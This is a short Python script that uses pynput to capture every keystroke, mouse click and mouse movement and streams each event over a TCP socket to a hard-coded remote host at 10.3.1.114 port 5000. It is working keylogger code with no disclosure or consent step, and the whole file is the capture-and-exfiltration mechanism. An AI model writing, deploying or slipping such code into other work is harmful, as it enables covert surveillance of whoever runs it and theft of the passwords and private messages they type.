import socket
from pynput import keyboard, mouse

# Define HOST and TCP_PORT
HOST = '10.3.1.114'
TCP_PORT = 5000

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the remote host
try:
    s.connect((HOST, TCP_PORT))
    print(f"Connected to {HOST}:{TCP_PORT}")
except socket.error as err:
    print(f"Connection error: {err}")
    exit(1)

def send_message(message):
    try:
        # Send the message through the socket
        s.sendall(message.encode())
    except socket.error as e:
        print(f"Error sending message: {e}")

def on_press(key):
    try:
        message = f"Key {key.char} pressed"
    except AttributeError:
        message = f"Special key {key} pressed"
    send_message(message)

def on_click(x, y, button, pressed):
    if pressed:
        message = f"Mouse clicked at ({x}, {y}) with {button}"
        send_message(message)

def on_move(x, y):
    message = f"Mouse moved to ({x}, {y})"
    send_message(message)

def main():
    # Create listeners for keyboard and mouse events
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)

    # Start listeners
    keyboard_listener.start()
    mouse_listener.start()

    try:
        # Keep the main thread running indefinitely
        keyboard_listener.join()
        mouse_listener.join()
    except KeyboardInterrupt:
        print("Stopping...")

    # Close the socket connection when done
    s.close()

if __name__ == "__main__":
    main()
